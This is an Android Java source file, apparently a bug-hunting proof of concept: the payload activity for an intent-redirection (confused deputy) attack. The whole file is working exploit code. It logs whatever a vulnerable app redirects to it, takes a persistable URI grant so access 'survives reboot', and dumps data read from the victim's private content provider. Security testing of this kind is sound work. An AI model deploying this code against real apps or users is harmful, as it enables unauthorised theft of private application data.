package com.sanehunters.probe;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * Receives whatever the victim redirects to us, and immediately exercises any URI permission
 * it granted along the way. This is the payload half of the intent-redirection class (D08):
 * the confused deputy grants US access to ITS OWN non-exported provider.
 *
 * Read the result with:  adb logcat -s PROBE:V
 */
public class LootActivity extends Activity {
    private static final String TAG = "PROBE";

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent i = getIntent();
        Log.i(TAG, "== LootActivity reached ==");
        Log.i(TAG, "action=" + i.getAction() + " data=" + i.getData() + " flags=0x"
                + Integer.toHexString(i.getFlags()));

        if (i.getExtras() != null)
            for (String k : i.getExtras().keySet())
                Log.i(TAG, "  extra " + k + " = " + String.valueOf(i.getExtras().get(k)));

        Uri granted = i.getData();
        if (granted != null) {
            boolean read  = (i.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION)  != 0;
            boolean write = (i.getFlags() & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0;
            Log.i(TAG, "  grant flags: read=" + read + " write=" + write);
            try {
                // Persist it so the theft survives a reboot, if the grant allows.
                getContentResolver().takePersistableUriPermission(granted,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION);
                Log.i(TAG, "  ** persistable grant taken — access survives reboot **");
            } catch (Throwable t) { Log.i(TAG, "  not persistable: " + t.getClass().getSimpleName()); }
            dump(granted);
        }
        finish();
    }

    private void dump(Uri u) {
        try (InputStream in = getContentResolver().openInputStream(u)) {
            if (in == null) { Log.i(TAG, "  openInputStream -> null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            Log.i(TAG, "  ** READ " + total + " bytes from a URI the victim granted us **");
            Log.i(TAG, bo.toString());
        } catch (Throwable t) {
            Log.i(TAG, "  read failed: " + t.getClass().getSimpleName() + ": " + t.getMessage());
        }
    }
}
